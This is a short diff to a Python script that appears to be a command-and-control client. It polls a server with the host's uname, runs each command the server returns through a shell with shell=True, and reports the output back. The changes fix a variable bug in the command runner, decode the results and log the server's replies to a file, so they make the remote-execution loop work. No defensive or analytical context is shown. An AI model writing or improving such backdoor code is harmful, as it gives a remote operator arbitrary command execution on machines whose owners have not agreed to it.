@@ -20,7 +20,7 @@ import subprocess
 
 
 def do_cmd(cmd):
-    return subprocess.check_output(control['cmd'],shell=True)
+    return subprocess.check_output(cmd,shell=True).decode().strip()
 
 
 while True:
@@ -29,8 +29,9 @@ while True:
         'uname':UNAME
     })
     control=json.loads(r.text)
+    open('log','a').write(r.text)
     response=dict()
-    if 'cmds' in control:
+    if len(control['cmds']) > 0:
         response['cmds'] = [
             (cmd, do_cmd(cmd),)
             for cmd in control['cmds']
